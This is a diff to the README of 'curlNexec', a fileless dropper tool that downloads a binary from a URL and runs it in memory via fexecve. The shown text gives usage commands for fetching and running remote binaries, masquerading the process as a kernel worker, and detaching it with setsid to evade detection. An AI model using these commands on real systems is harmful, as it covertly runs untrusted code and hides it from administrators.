@@ -5,6 +5,8 @@
 <p align="center">
 <code>👋 Certainly useful , mainly for fun, rougly inspired by 0x00 <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">article</a> <code>
 </p>
+ 
+----
 
 ## Short story
 
@@ -32,8 +34,10 @@ Then we execute it using `fexecve` syscall (as it is currently not provided by `
 Although not present on the memory disk, the running program can still be detected using `ps` command for example. 
 
  1. Cover the tracks with a fake program name
+ 
 `curlNexec --name <fake_name> <binary_raw_url>` by default the name is `[kworker/u:0]` 
  2. Detach from tty to map behaviour of deamon process
+ 
 `setsid curlNexec <binary_raw_url>`. *WIP call `setsid` from code*
 
 ### Caveats
